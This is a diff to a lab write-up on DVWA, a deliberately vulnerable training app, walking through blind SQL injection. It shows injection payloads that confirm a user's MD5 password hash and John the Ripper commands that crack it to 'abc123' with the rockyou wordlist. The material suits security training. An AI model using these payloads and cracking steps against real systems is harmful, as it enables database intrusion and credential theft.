@@ -114,4 +114,14 @@ Fromm the previous exercise, we know that the target hash is `e99a18c428cb38d5f2
 etc.
 - `2' AND password LIKE 'e99a18c428cb38d5f260853678922e03%'; -- ` **TRUE**
 - `2' AND password LIKE 'e99a18c428cb38d5f260853678922e03'; -- ` **TRUE**
-We have now confirmed that this is indeed the hash of Gordon Brown. Doing this without the knowledge of the hash would've taken a really long time, so this would normally be done using an automated approach (python script or whatever).
+We have now confirmed that this is indeed the hash of Gordon Brown. Doing this without the knowledge of the hash would've taken a really long time, so this would normally be done using an automated approach (see [**here**](#automated)). For the remaining vulnerabilitiies, once I demonstrate how to get 1 bit of information I will consider the problem solved and move on.
+
+Now that we have the hash, we want to recover the password using our good friend John. The hash we obtained is a raw MD5 hash. To crack it with john, placed the hash in [hash.txt](hash.txt), which simply contains `gordonb:e99a18c428cb38d5f260853678922e03`. I then ran the command `john --format=raw-md5 --wordlist=/usr/share/dict/wordlist-probable.txt --rules hash.txt`, which specified the format to `raw-md5`. This loaded the hash, but was unable to crack it, meaning that we need a different word list. Kali has a large wordlist available: `rockyou.txt`. To access it, first unzip it using `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`. Running john again using this new wordlist cracks the password:
+```
+$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt
+abc123           (gordonb)
+```
+The password for gordonb is therefore abc123, which works when trying to login!
+
+<a name="automated"></a> Automating aa blind SQL injection against DVWA
+-------------
